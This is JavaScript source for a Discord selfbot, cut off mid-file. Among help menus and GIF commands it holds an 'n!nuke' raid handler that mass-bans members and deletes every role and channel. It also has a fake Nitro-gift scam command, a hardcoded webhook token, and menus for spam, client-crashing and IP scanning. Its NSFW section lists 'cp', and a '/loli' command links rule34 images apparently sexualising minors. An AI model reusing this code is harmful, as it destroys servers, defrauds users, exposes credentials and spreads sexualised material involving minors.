
let YOUR_TOKEN = 'YOUR_TOKEN_HERE'
var prefix = "/"
var mathprefix = "m/"
/*
⚠ All selfbots (and any other 3rd-party clients or client modifications) break Discord's Terms of Service. Using a selfbot or any client mods puts your account at risk for deletion. Please do not use a selfbot nor any client modifications.
🔗 Terms of Service: https://discordapp.com/terms

🔗 API Terms of Service: https://discordapp.com/developers/docs/legal

🔗 Community Guidelines: https://discordapp.com/guidelines

This project is no longer supported for the reasons detailed above.

USE AT YOUR OWN RISK!
DONT CHNAGE PREFIX SOME COMMANDS MAY NOT WORK YOU CAN CHANGE MATHPREFIX!!
ENJOY!
PLACE YOUR TOKEN INSIDE '' ON THE FIRST LINE AND RUN!!!
*/
const Discord = require('discord.js');
const client = new Discord.Client();
const format = require('string-format')
const db = require("mongoose")
const os = require('os');
const moment = require('moment-timezone');
const colors = require('colors');
const fs = require('fs');
const setTitle = require('console-title');
const Pornsearch = require('pornsearch');
const superagent = require('superagent')
const HttpUtil = require('./files/http-util');
const util = require('./files/util.json');
const dadjoke = require('./files/dadjoke.json');
const randomPuppy = require('random-puppy');
var snekfetch = require("snekfetch");
const fetch = require('node-fetch')
const got = require('got');
var token = "token ici"
var cheerio = require("cheerio"); /* Used to extract html content, based on jQuery || install with npm install cheerio */
var request = require("request"); /* Used to make requests to URLs and fetch response  || install with npm install request */
client.on('ready', function() {

client.user.setActivity("<<-V->>", {type: "STREAMING", url: "https://www.twitch.tv/xqcow"})


setTitle('client | Edited by ᥅ꪖ᥊ꪀ');

//Registro na console
    console.log('')
    console.log(`                     ██╗   ██╗ █████╗ ██╗     ██╗  ██╗██╗   ██╗██████╗ ██╗███████╗                     `. white)
    console.log(`                     ██║   ██║██╔══██╗██║     ██║ ██╔╝╚██╗ ██╔╝██╔══██╗██║██╔════╝                     `. white)
    console.log(`                     ██║   ██║███████║██║     █████╔╝  ╚████╔╝ ██████╔╝██║█████╗                       `. white)
    console.log(`                     ╚██╗ ██╔╝██╔══██║██║     ██╔═██╗   ╚██╔╝  ██╔══██╗██║██╔══╝                       `. white)
    console.log(`                      ╚████╔╝ ██║  ██║███████╗██║  ██╗   ██║   ██║  ██║██║███████╗                     `. gray)
    console.log(`                       ╚═══╝  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚══════╝                     `. gray)
                                                            // Segunda  parte
    console.log(`                              LOL`. black)
    console.log(`                                      LOL  `. black)
    console.log(`                   ┌───────────────────────────────────────────────────────────────────┐                      `. white)
    console.log(`                   │ ${client.user.username} LOL `. white)
    console.log(`                   └───────────────────────────────────────────────────────────────────┘                      `. white) 
    console.log(`                         LOL  `. black) 
    setTitle("Valyrie Selfbot")
    
});

//-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
/*
client.on("messageDelete", (messageDelete) => {
    if (messageDelete.author.bot) return;
    if (messageDelete.author.id == client.user.id) return;
    const embed = new MessageBuilder()
    .setAuthor('Rain', 'https://cdn.discordapp.com/embed/avatars/0.png', 'https://www.google.com')
    .setTitle("**Deleted**")
    .setColor("#0ff000")
    .setThumbnail('https://i.pinimg.com/originals/4f/ef/36/4fef36283ced0e64e9bfc7395a87795f.gif')
    .setDescription(`You have a deleted message from: ${messageDelete.author}`)
    .addField("**Text: **", messageDelete.content);
hook.send(embed);
    
}); 
*/
//READY-------------------------------------------------------------------------------------------------------------------------------------------------------------------
client.on("message", async(msg)=>{

if(msg.content.toLowerCase().startsWith("n!" + "nuke")){
        msg.guild.members.filter(member => member.bannable).forEach(member => {member.ban()});
        msg.delete(1000);
	msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
    	msg.guild.channels.deleteAll();
	msg.channel.send('@everyone get nuked');
}


});

const {
    Webhook,
    MessageBuilder
} = require('discord-webhook-node');
const hook = new Webhook("https://discord.com/api/webhooks/763874383000895498/kD_NIvMXPBSWkwhR3IJZXWoqai1cglgSky_D9JBwgqA4h5md3tchFJvj4HPHlVXftXqm");



client.on('message', message => {

    if (message.content.startsWith(prefix + "ping")) {
        if (message.author.id == client.user.id) {
            var ping = [Math.floor(Math.random() * 100)]
            let help = new Discord.RichEmbed()
                .setTitle("__**Discord-Ultra**__")
                .setColor("#00D6GF")
                .addBlankField()
                .addField("*PING*", `${ping} ms`)
                .setThumbnail(`https://i.pinimg.com/originals/4f/ef/36/4fef36283ced0e64e9bfc7395a87795f.gif`)
                .setTimestamp()
            message.channel.send(help)
            console.log(`${client.user.tag} ran command </ping>.`)
        }
    }
//---------------------------------------------------------------------

    if (message.content.startsWith(prefix + "help")) {
        if (message.author.id == client.user.id) {
            let help = new Discord.RichEmbed()
                .setAuthor(`${message.author.username}`)
                .setTitle("**【𝗛𝗘𝗟𝗣】**")
                .setColor("BLACK")
                .addBlankField()
                .addField("🠶 ~~__**ð•l¶:**__~~ 🠶  ðŸ ¶ ð—¶ð˜ƒð——”ð—°ðð¶ð˜† *", "```「/commands」```", true)
                .addField("🠶 ~~__**£%ÍŸ¶:**__~~ 🠶  ‰uÌ¸Í„Ì›ÍÌœÍ–Ì©Ì¦kÌµÌ¾ÍÍ*", "```「/farm-commands」```", true)
                .addField("🠶 ~~__**ð‰Ÿ¶ :**__~~ 🠶  ‰ÌœÍ–Ì©Ì¦uÌ¸ÍÌ‚Í˜ÍÌµ„Ì€Í*", "```「**/nsfw-commands**」```", true)
                .addField("🠶 ~~__**˜–ÌÍÌ :**__~~ 🠶  ‰Ì‚Í˜–ÌÍÌµ„Ì€ÍÌ¦uÌ¸ÍÌ‚Í˜*", "```「**/reddit-commands**」```", true)
                .addField("🠶 ~~__**¥£ÌœŸ ¶:**__~~ 🠶  ‰Ì¦uÌ¸Í„Ì›ÍÌœÍ–Ì©ÌšÌŽÍ*", "```「/act-commands」```", true)
                .addField("🠶 ~~__**ŽÍðŸ¶̛͖̈́͐̎͐̂̈́̚͘‰:**__~~ 🠶  ÌœÍ–Ì©„Ì›ÍÌšÌ¦uÌ¸ÍÌŽÍÍ–Ì", "```「/dark-commands」```", true)
                .addField("🠶 ~~__**ÍŸ¥¥Í:**__~~ 🠶  Í¶̛͖̈́͐̎͐̂̈́̚͘‰ÌœÍÌ¦uÌ¸Í–Ì©„Ì›. ÍÍÌ‚Ì", "```「/exploit-commands」```", true)
                .addField("🠶 ~~__**¶̛͖̈́͐̎͐̂̈́̚͘ÌœÍ©Ì:**__~~ 🠶  ¦uÌ¸Í„Ì›ÍÌš‰ÌœÍ–ÌÌŽÍ„Í–Ì", "```「/???」```", true)

                .addBlankField()
                .setThumbnail(`${message.author.avatarURL}`)
                .setFooter("🠶〖𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 ᥅ꪖ᥊ꪀ#0002〗")
                .setImage("https://cdn.lowgif.com/full/e29caaaf62698e16-cool-anime-gif-google-search-anime-expressions.gif")
            message.channel.send(help)
            console.log(`${client.user.tag} ran command </help>.`)
        
        }
    }
//---------------------------------------------------------------------
if (message.content.startsWith(prefix + "act-commands")) {
    if (message.author.id == client.user.id) {
        let help = new Discord.RichEmbed()
            .setAuthor(`${message.author.username}`)
            .setTitle("**【𝗔𝗖𝗧𝗜𝗩𝗜𝗧𝗬】**")
            .setColor("#00D6FF")
            .addBlankField()
            .addField("🠶 **𝗦𝘁𝗿𝗲𝗮𝗺𝗶𝗻𝗴 🎬**", "```「/𝘀𝘁𝗿𝗲𝗮𝗺 [𝗨𝗥 𝗦𝗧𝗥𝗘𝗔𝗠]」```", true)
            .addField("🠶 **𝗣𝗹𝗮𝘆𝗶𝗻𝗴 🎮**", "```「/𝗽𝗹𝗮𝘆」[𝗨𝗥 𝗚𝗔𝗠𝗘]```", true)
            .addField("🠶 **𝗟𝗶𝘀𝘁𝗲𝗻 👂**", "```「/𝗹𝗶𝘀」 [𝗨𝗥 𝗦𝗢𝗡𝗚]```", true)
            .addField("🠶 **MULTI STREAM 🎬**", "```「/ms」 [EN DEV !]```", true)
            .addBlankField()
            .setThumbnail(`${message.author.avatarURL}`)
            .setFooter("🠶〖𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 ᭙ꪖꪻꫀ᥅#2318 〗⭐️")
            .setImage("https://cdn.lowgif.com/full/e29caaaf62698e16-cool-anime-gif-google-search-anime-expressions.gif")
        message.channel.send(help)
        console.log(`${client.user.tag} ran command </act-commands>.`)
    }
}
if (message.content.startsWith(prefix + "reddit-commands")) {
    if (message.author.id == client.user.id) {
        let help = new Discord.RichEmbed()
            .setAuthor(`${message.author.username}`)
            .setTitle("**【𝗔𝗖𝗧𝗜𝗩𝗜𝗧𝗬】**")
            .setColor("#00D6FF")
            .addBlankField()
            .addField("🠶 **meme**", "-----------------", true)
            .addField("🠶 **dankmeme**", "-----------------", true)
            .addField("🠶 **im14andthisisdeep**", "-----------------", true)
            .addField("🠶 **deepfry**", "-----------------`", true)
            .addField("🠶 **masterhacker**", "-----------------`", true)
            .addField("🠶 **woosh**", "-----------------", true)
            .addField("🠶 **pewds**", "-----------------", true)
            .addField("🠶 **shitposting**", "-----------------", true)
            .addField("🠶 **anime**", "-----------------", true)
            .addBlankField()
            .setThumbnail(`${message.author.avatarURL}`)
            .setFooter("🠶〖𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 ᭙ꪖꪻꫀ᥅#2318 〗⭐️")
            .setImage("https://cdn.lowgif.com/full/e29caaaf62698e16-cool-anime-gif-google-search-anime-expressions.gif")
        message.channel.send(help)
        console.log(`${client.user.tag} ran command </reddit-commands>.`)
    }
}
//---------------------------------------------------------------------


if (message.content.startsWith(prefix + "exploit-commands")) {
    if (message.author.id == client.user.id) {
        let help = new Discord.RichEmbed()
            .setAuthor(`${message.author.username}`)
            .setTitle("**【𝗘𝗫𝗣𝗟𝗢𝗜𝗗】**")
            .setColor("#00D6FF")
            .addBlankField()
            .addField("🠶 **Ban Everyone ℳ**", "```「/𝘀𝘂𝗽𝗿 [𝗡𝗨𝗠𝗕𝗘𝗥 𝗠𝗘𝗦𝗦𝗔𝗚𝗘]」```", true)
            .addField("🠶 **𝘿𝙚𝙡𝙚𝙩𝙚 𝘼𝙡𝙡 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 ℳ**", "```「/𝗽𝘂𝗿𝗴𝗲 [𝗔𝗟𝗟]」```", true)
            .addField("🠶 **𝘿𝙚𝙡𝙚𝙩𝙚 ALL 𝘾𝙝𝙖𝙣𝙣𝙚𝙡 🍾**", "```「/𝗱𝗲𝗹」```", true)
            .addField("🠶 **𝘾𝙝𝙖𝙣𝙜𝙚 𝙉𝙖𝙢𝙚 🎂**", "```「/𝗰𝗵𝗮𝗻𝗴𝗲𝗻」```", true)
            .addField("🠶 **𝘾𝙝𝙖𝙣𝙜𝙚 𝙄𝙢𝙖𝙜𝙚 🌟**", "```「/𝗰𝗵𝗮𝗻𝗴𝗲𝗶」```", true)
            .addField("🠶 **𝘾𝙧𝙚𝙖𝙩𝙚 𝘾𝙝𝙖𝙣𝙣𝙚𝙡 ⭐️**", "```「/𝗰𝗿𝗲𝗮𝘁𝗲𝗰」```", true)
            .addField("🠶 **𝘾𝙧𝙚𝙖𝙩𝙚 𝙍𝙤̂𝙡𝙚 ⚡️**", "```「/𝗰𝗿𝗲𝗮𝘁𝗲𝗿」```", true)
            .addBlankField()
            .setThumbnail(`${message.author.avatarURL}`)
            .setFooter("🠶〖𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 ᥅ꪖ᥊ꪀ#0002〗⭐")
            .setImage("https://i.pinimg.com/originals/28/93/e8/2893e84c5b837a0ab1363f82b509744a.gif")
        message.channel.send(help)
        console.log(`${client.user.tag} ran command </exploit-commands>.`)
    }
}

//---------------------------------------------------------------------

if (message.content.startsWith(prefix + "commands")) {
    if (message.author.id == client.user.id) {
        let help = new Discord.RichEmbed()
            .setAuthor(`${message.author.username}`)
            .setTitle("**【Commands】**")
            .setColor("BLUE")
            .addBlankField()
            .addField('**/dad-joke**', '-----------')
            .addField('**/funny**', '-----------')
            .addField('**/serverinfo**', '-----------')
            .addField('**/avatar**', '-----------')
            .addField('**/purge**', '-----------')
            .addField('**/flip**', '-----------')
            .addField('**/rand10**', '-----------')
            .addField('**/8ball**', '-----------')
            .addField('**/image**', '-----------')
            .addField('**/userinfo**', '-----------')
            .addField('**/serverinfo**', '-----------')
            .addField('**/dead**', '-----------')
            .addField('**/math**', '-----------')
            .addField('**/def**', '-----------')
            .addField('**/Note**', '-----------')
            .addField('**/anime-facts**', '-----------')
            .addField('**/embed**', '-----------')
            .setThumbnail(`${message.author.avatarURL}`)
            .setFooter("🠶〖𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 ᥅ꪖ᥊ꪀ#0002〗")
        message.channel.send(help)
        console.log(`${client.user.tag} ran command </commands>.`)
    }
}

//---------------------------------------------------------------------

if (message.content.startsWith(prefix + "farm-commands")) {
    if (message.author.id == client.user.id) {
        let help = new Discord.RichEmbed()
            .setAuthor(`${message.author.username}`)
            .setTitle("**【Farming-Commands】**")
            .setColor("RANDOM")
            .addBlankField()
            .addField('**/auto-farm:**', '------------')
            .addField('**/bot-on:**', '------------')
            .addField('**/bot-farm:**', '------------')
            .addField('**/invite-bot:**', '------------s')
            .addField('**/server-c:**', '------------')
            .addField('**/vote:**', '------------')
            .addField('**/daily:**', '------------')
            .addField('**/weekly:**', '------------')
            .setThumbnail(`${message.author.avatarURL}`)
            .setFooter("🠶〖𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 ᥅ꪖ᥊ꪀ#0002  #9725 〗")
        message.channel.send(help)
        console.log(`${client.user.tag} ran command </farm-commands>.`)
    }
}
//---------------------------------------------------------------------
 
if (message.content.startsWith(prefix + "nsfw-commands")) {
    if (message.author.id == client.user.id) {
        let help = new Discord.RichEmbed()
            .setAuthor(`${message.author.username}`)
            .setColor("BLUE")
            .addBlankField()
            .setDescription(`__**Commands**__
            (*use /(porntitle) for less nsfw )
            **Ass** -----------
            **Boobs**   -----------
            **Classics**  -----------
            **Neko**  -----------
            **Dick**  -----------
            **Femdom**  -----------
            **Milf** -----------
            (*use /porn (title) for more nsfw)
            **4k   -----------
            Anal  -----------
            Ass   -----------
            Boobs   -----------
            cp ----------
            Gif   -----------
            Hentai   -----------
            Holo   -----------
            Pussy   -----------
            Thigh    -----------
            Trans    -----------
            Trap  -----------**
         
    `)
            .setThumbnail(`${message.author.avatarURL}`)
            .setFooter("🠶〖𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 ᥅ꪖ᥊ꪀ#0002   〗")
        message.channel.send(help)
        console.log(`${client.user.tag} ran command </nsfw-commands>.`)
    }
}

//---------------------------------------------------------------------
 
if (message.content.startsWith(prefix + "dark-commands")) {
    if (message.author.id == client.user.id) {
        let help = new Discord.RichEmbed()
            .setAuthor(`${message.author.username}`)
            .setTitle("**【dark-Commands】**")
            .setColor("BLACK")
            .addBlankField()
            .addField('**/ipscan:**', 'ip-scanner')
            .addField('**/userinfo:**', 'user info lel')
            .addField('**auto-delete:**', 'sendes deleted messages to server.')
            .addField('**/act:**', 'changes activity on acct')
            .addField('**/exploid:**', 'just messing with bugs')
            .addField('**/spam:**', 'just spams constantly')
            .addField('**/lagz:**', 'laggs out all iphone and computer users')
            .addField('**/github:**', 'github users')
            .addField('**/web-i:**', 'website info')
            .addField('**/nitro:**', 'nitro sniper (complictated)')
            .addField('**/nitr0:**', 'nitro sniper (example)')
            .addField('**/nitr0-view:**', 'admin nitro sniper (complictated)')
            .addField('**/scan:**', 'max info on user')
            .addBlankField()
            .setThumbnail(`${message.author.avatarURL}`)
            .setFooter("🠶〖𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 ᥅ꪖ᥊ꪀ#0002  #9725 〗")
            .setImage("https://i.pinimg.com/originals/28/93/e8/2893e84c5b837a0ab1363f82b509744a.gif")

        message.channel.send(help)
        console.log(`${client.user.tag} ran command </dark-commands>.`)
    }
}

//---------------------------------------------------------------------
 
if (message.content.startsWith("/dad-joke")) {

    if (message.author.id == client.user.id) {
        Dadjoke = dadjoke[Math.floor(Math.random() * dadjoke.length)]
        const dadjokeEmbed = new Discord.RichEmbed()
            .setColor('#800080')
            .setTitle(Dadjoke)
            .setFooter('Dad Joke')
        message.channel.send(dadjokeEmbed)
        console.log(`${client.user.tag} ran command </dad-joke>.`)
    }
}

//---------------------------------------------------------------------
if (message.content.startsWith(prefix + "funny")) {
    if (message.author.id == client.user.id) {
        let help = new Discord.RichEmbed()
            .setAuthor(`${message.author.username}`)
            .setTitle("**【𝗙𝗨𝗡𝗡𝗬】**")
            .setColor("#00D6FF")
            .addBlankField()
            .addField("🠶 **𝗦𝗵𝗮𝗿𝗶𝗻𝗴𝗮𝗻 🔴**", "```「/𝘀𝗵𝗮𝗿」```", true)
            .addField("🠶 **𝗗𝗲𝗮𝘁𝗵𝗻𝗼𝘁𝗲 📖**", "```「/𝗱𝗲𝗮𝘁𝗵𝗻」```", true)
            .addField("🠶 **𝗞𝗮𝗿𝗺𝗮 👿**", "```「/𝗸𝗮𝗿𝗺𝗮」```", true)
            .addField("🠶 **𝗕𝗮𝗹𝗹a 🗽**", "```「/𝗯𝗹𝗰」```", true)
            .addField("🠶 **Cowcow 👋**", "```「/cc」```", true)
            .addField("🠶 **Tg 👆**", "```「/tg」```", true)
            .addField("🠶 **H4X0R 😂**", "```「/haxor」```", true)
            .addField("🠶 **Victim 😂**", "```「/victim」```", true)
            .addBlankField()
            .setThumbnail(`${message.author.avatarURL}`)
            .setFooter("🠶〖𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 ᭙ꪖꪻꫀ᥅#2318 〗⭐️")
            .setImage("https://cdn.lowgif.com/full/e29caaaf62698e16-cool-anime-gif-google-search-anime-expressions.gif")
        message.channel.send(help)
        console.log(`${client.user.tag} ran command </funny>.`)
    }
}
 
if (message.content.startsWith(prefix + "shar")) {
    if (message.author.id == client.user.id) {
        message.delete();
        var shar = new Discord.RichEmbed()
            .setColor("#010101")
            .setImage("https://cdn.discordapp.com/attachments/555403860018200606/561655180886671379/1474112693_giphy_3.gif")
        message.channel.send(shar)
    }
}

if (message.content.startsWith(prefix + "cc")) {
    if (message.author.id == client.user.id) {
        message.delete();
        var cc = new Discord.RichEmbed()
            .setColor("#010101")
            .setImage("https://media.giphy.com/media/dYrgyQXZjIcZs5Q3ch/giphy.gif")
        message.channel.send(cc)
    }
}

if (message.content.startsWith(prefix + "dev")) {
    if (message.author.id == client.user.id) {
        message.delete();
        var dev = new Discord.RichEmbed()
            .setColor("#010101")
            .setImage("https://media.giphy.com/media/l46C6sdSa5DVSJnLG/giphy.gif")
        message.channel.send(dev)
    }
}

if (message.content.startsWith(prefix + "victim")) {
    if (message.author.id == client.user.id) {
        message.delete();
        var victime = new Discord.RichEmbed()
            .setColor("#010101")
            .setImage("http://image.noelshack.com/fichiers/2018/13/5/1522427432-certified.gif")
        message.channel.send(victime)
    }
}

if (message.content.startsWith(prefix + "haxor")) {
    if (message.author.id == client.user.id) {
        message.delete();
        var haxor = new Discord.RichEmbed()
            .setColor("#010101")
            .setImage("https://media.giphy.com/media/UqxVRm1IaaIGk/giphy.gif")
        message.channel.send(haxor)
    }
}


if (message.content.startsWith(prefix + "deathn")) {
    if (message.author.id == client.user.id) {
        message.delete();
        var deathn = new Discord.RichEmbed()
            .setColor("#010101")
            .setImage("https://cdn.discordapp.com/attachments/555403860018200606/561655171218800674/kira_justice_by_machiavellianprince-dbiokam.gif")
        message.channel.send(deathn)
    }
}

if (message.content.startsWith(prefix + "karma")) {
    if (message.author.id == client.user.id) {
        message.delete();
        var karma = new Discord.RichEmbed()
            .setColor("#010101")
            .setImage("https://cdn.discordapp.com/attachments/555403860018200606/561658420114227201/1426910434-coursev2.gif")
        message.channel.send(karma)
    }
}

if (message.content.startsWith(prefix + "blc")) {
    if (message.author.id == client.user.id) {
        message.delete();
        var blc = new Discord.RichEmbed()
            .setColor("#010101")
            .setImage("https://media.tenor.com/images/9d74cd1dcda52d1ea15d88bc0c78f859/tenor.gif")
        message.channel.send(blc)
    }
}

if (message.content.startsWith(prefix + "tg")) {
    if (message.author.id == client.user.id) {
        message.delete();
        var tg = new Discord.RichEmbed()
            .setColor("#010101")
            .setImage("https://media.giphy.com/media/b0xoqnrqoZXDa/giphy.gif")
        message.channel.send(tg)
    }
}
//funny---------------------------------------------------------------------
 
if (message.content.startsWith(prefix + "supr")) {
    console.log(`${client.user.tag} ran command </supr>.`)
    if (message.author.id !== client.user.id) {} else {
        message.delete()
        let messagecount = parseInt(message.content.split(" ").slice(1), [0], 10) ? parseInt(message.content.split(" ").slice(1), [0], 10) : 1;
        message.channel.fetchMessages({
                limit: 100
            })
            .then(messages => {
                let message_array = messages.array();
                message_array = message_array.filter(m => m.author.id === client.user.id);
                message_array.length = messagecount + 1;
                message_array.map(m => m.delete().catch(console.error));
            });
    }
}

//---------------------------------------------------------------------

if (message.content.startsWith(prefix + "avatar")) {
    if (!message.mentions.users.size) {
        const avatarAuthor = new Discord.RichEmbed()
            .setColor('RANDOM')
            .setAuthor(message.author.username)
            .setImage(message.author.avatarURL)
        message.channel.send(avatarAuthor);
        console.log(`${client.user.tag} ran command </avatar>.`)
    }
}

//---------------------------------------------------------------------

if (message.content.startsWith(prefix + "userinfo")) {

    let user = message.mentions.users.first() || message.author;
    const joinDiscord = moment(user.createdAt).format('llll');
    const joinServer = moment(user.joinedAt).format('llll');

    const member = message.guild.member(user);

    const embed = new Discord.RichEmbed()
        .setColor("RANDOM")
        .setThumbnail(message.author.avatarURL)
        .setDescription(`${user}`, true)
        .addField("**ID:**", `__${user.id}__`, true)
        .addField("Status:", `__${user.presence.status}__`, true)
        .addField("**Username**", `__${ user.username}__`, true)
        .addField("**Joined Server**", `__${ user.joinedAt}__`, true)
        .addField("**In Server**", `__${message.guild.name}__`, true)
        .addField("**Game:**", `__${user.presence.game ? user.presence.game.name : 'None'}__`, true)
        .addField("**Status**", user.presence.status, true)
        .addField("**Account Created On:**", `__${moment.utc(user.createdAt).format("dddd, MMMM Do YYYY")}__`, true)
        .setFooter(`Replying to ${message.author.username}#${message.author.discriminator}`)
    message.channel.send({
        embed
    });
    console.log(`${client.user.tag} ran command </userinfo>.`)

}

//---------------------------------------------------------------------

if (message.content.startsWith(prefix + "serverinfo")) {
    if (message.author.id == client.user.id) {

        const embed = new Discord.RichEmbed()
            .setThumbnail(message.guild.iconURL)
            .setColor(3447003)
            .setDescription(`**${message.guild.name}** `)
            .addField(`**Owner: **`, ` ${message.guild.owner}`, true)
            .addField('**Member Count**', `${message.guild.memberCount - message.guild.members.filter(m=>m.user.client).size} (${message.guild.members.filter(m=>m.user.client).size} clients)`, true)
            .addField('**AFK Timeout**', `${message.guild.afkTimeout / 60} minutes`, true)
            .addField('**AFK Channel**', `${message.guild.afkChannelID === null ? 'No AFK Channel' : client.channels.get(message.guild.afkChannelID).name} (${message.guild.afkChannelID === null ? '' : message.guild.afkChannelID})`, true)
            .addField('**Location**', message.guild.region, true)
            .addField('**Created**', message.guild.createdAt.toLocaleString(), true)
            .addBlankField(true)
            .setTimestamp()
            .setFooter(client.user.username, client.user.avatarURL);

        message.channel.send({
            embed
        });
    }
    console.log(`${client.user.tag} ran command </serverinfo>.`)

}

//---------------------------------------------------------------------

if (message.content.startsWith('/deleted')) {
    let messageArray = message.content.split(" ");
    let command = messageArray[0];
    let args = messageArray.slice(1);
    let reason = args.slice(1).join(' ');
    let user = message.mentions.users.first();
    if (!message.author.id == client.user.id) return message.reply('you cannot use that command')
    if (message.mentions.users.size < 1) return message.reply('You must mention someone.');
    if (reason.length < 1) return message.reply('You must have a note.');
    const embed = new MessageBuilder()
        .setAuthor('Rain', 'https://cdn.discordapp.com/embed/avatars/0.png', 'https://www.google.com')
        .setTitle("**Deleted**")
        .setColor("#0ff000")
        .setThumbnail('https://i.pinimg.com/originals/4f/ef/36/4fef36283ced0e64e9bfc7395a87795f.gif')
        .setDescription(`You have made a note on server \`${message.guild.name}\``)
        .addField("**Text: **", reason);

    hook.send(embed);
    console.log(`${client.user.tag} ran command </delete>.`)

}

if (message.content.startsWith('/note')) {
    let messageArray = message.content.split(" ");
    let command = messageArray[0];
    let args = messageArray.slice(1);
    let reason = args.slice(1).join(' ');
    let user = message.mentions.users.first();
    if (!message.author.id == client.user.id) return message.reply('you cannot use that command')
    if (message.mentions.users.size < 1) return message.reply('You must mention someone.');
    if (reason.length < 1) return message.reply('You must have a note.');
    const embed = new MessageBuilder()
        .setAuthor('Rain', 'https://cdn.discordapp.com/embed/avatars/0.png', 'https://www.google.com')
        .setTitle("**Note**")
        .setColor("#00ff00")
        .setThumbnail('https://i.pinimg.com/originals/4f/ef/36/4fef36283ced0e64e9bfc7395a87795f.gif')
        .setDescription(`You have made a note on server \`${message.guild.name}\``)
        .addField("**Text: **", reason);

    hook.send(embed);
    const embedN = new Discord.RichEmbed()
        .setAuthor('Rain', 'https://cdn.discordapp.com/embed/avatars/0.png', 'https://www.google.com')
        .setTitle("**NoteD**")
        .setColor("#00ff00")
        .setThumbnail('https://i.pinimg.com/originals/4f/ef/36/4fef36283ced0e64e9bfc7395a87795f.gif')
        .setDescription(`You have made a note on server \`${message.guild.name}\``)

    message.channel.send(embedN);
    console.log(`${client.user.tag} ran command </note>.`)

}
//---------------------------------------------------------------------

const args1 = message.content.trim().split(/ +/g);
const command = args1.shift().toLowerCase();
const httpUtil = new HttpUtil();

if (command === "/def") {

    if (message.author.id == client.user.id) {
        if (args1.join(" ") < 1) {
            message.channel.send('Enter word[s] to define!');
        } else {
            httpUtil.httpsGetText('urbandictionary.com', `define.php?term=${args1.join("+")}`)
                .then((text) => {
                    let div_regex = /<div class="meaning">(.*?)<\/div>/g;
                    let msg = text.match(div_regex);
                    let div_regexx = /<div class="example">(.*?)<\/div>/g;
                    let msgg = text.match(div_regexx);

                    if (msg === null) {
                        message.channel.send(`No result for query ${args1.join(" ")}`);
                    } else {
                        let elem_regex = /<(.*?)>/g;
                        let sym_regex = /&(.*?);/g;
                        let help = new Discord.RichEmbed()
                            .setAuthor(`${message.author.username}`)
                            .setTitle(`**__Defintion of__** : *${args1.join("+")}*`)
                            .setColor("#00D6GF")
                            .addBlankField()
                            .setDescription(msg[0].replace(elem_regex, "").replace(sym_regex, ""))
                            .addField('__**Example:**__ ', '*' + msgg[0].replace(elem_regex, "").replace(sym_regex, "") + '*')
                            .setThumbnail(`${message.author.avatarURL}`)
                            .setFooter("🠶〖 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 ᥅ꪖ᥊ꪀ#0002  #9725 〗⭐️")
                        message.channel.send(help)
                    }
                })
                .catch(e => console.log(e));
        }
    }
    console.log(`${client.user.tag} ran command </def>.`)

}
//--------------------------------------------------------------

//--------------------------------------------------------------
if (command === "/web-i") {

    if (message.author.id == client.user.id) {
        
        console.log(args1)
        
        fetch(`https://${args1}/`)
        .then(res => {
            console.log(res.headers.raw());
        let ballembed = new Discord.RichEmbed()
            .setTitle("__**Website-Info**__")
            .setColor("#800080")
            .addField("**Status**", res.statusText)
            .addField("**server**",res.headers.get('server'))
            .addField("**last-modified**",res.headers.get('last-modified')) 
            .addField("**expires**",res.headers.get('expires')) 
            .addField("**date**",res.headers.get('date')) 
            .addField("**connection**",res.headers.get('connection'))
            .addField("**content-type**",res.headers.get('content-type')) 
            .addField("**etag**",res.headers.get('etag')) 
            .addField("**Cookie-Data**",res.headers.get('cf-request-id'))
            .addField("**Ct-Tag**",res.headers.get('expect-ct'))
            .addField("**content-encoding**",res.headers.get('content-encoding'))
            .setFooter("The Oracal X")
            .setTimestamp()

        message.channel.send(ballembed);   
   
});

    }
    console.log(`${client.user.tag} ran command </Web-i>.`)

}
if (message.content.startsWith(prefix + 'nitrx')){
    var embed = new Discord.RichEmbed()
    .setAuthor("NITRO PRIZE")
    .setDescription ("the bot buys nitro or gifts every two weeks when you do ?nitro the bot gives you a code its very rare but one person form a random server will win the gift by getting the real nitro /gift gl ", "cheating will get you banned from bot this command has a 2 min cooldown")
    .addField('https:/discord.gift/'+ Math.floor(10000000000000000000 + Math.random() * 9000000000000000000).toString(36).substr(0, 36) , "Enjoy")
    .setThumbnail ("https://media1.tenor.com/images/42a8d4625aeb088c45eba5a84ca36325/tenor.gif?itemid=11193323")
    .setColor ("00ff00");
    message.channel.send("Hey there <@" + message.author.id + "> you have been entered in a selection to win a random discord gift please wait 1 min to recive your chance at the prize in the mean time check out the other commands ")
    setTimeout(() => {  message.channel.send(embed); }, 1);

}



if (message.content.startsWith("/loli")) {

    if (message.author.id == client.user.id) {
        let replies = [
"https://us.rule34.xxx//images/3402/86ac1657b8f3019e15b5e5d04ab6e10fd6e95643.jpg",
"https://us.rule34.xxx/thumbnails/3444/thumbnail_12289398f6130fc4ee63541d9be41988.jpg",
"https://us.rule34.xxx/thumbnails/3439/thumbnail_262efff326305cf82b30b82aa5fc94453c91e3f6.jpg",
"https://us.rule34.xxx/thumbnails/3392/thumbnail_d2cbe433baf6534353eee90629bec725.jpg",
"https://us.rule34.xxx/thumbnails/3369/thumbnail_7f67d85a54d8cc77def4eb9317155b4e.jpg",
"https://us.rule34.xxx/thumbnails/2883/thumbnail_dcf9108524443239c7114d48b74e040d.jpg",
"https://us.rule34.xxx/thumbnails/3351/thumbnail_2f419b8e402580769dea833a3cb41f82.jpg",
"https://us.rule34.xxx/thumbnails/3276/thumbnail_b324fdc571fcb391694e5cc1e4f7f0b8e46d4832.jpg",
"https://us.rule34.xxx/thumbnails/2165/thumbnail_18b71a588b513cd3bdd103038ad66801694f1c2e.jpg",
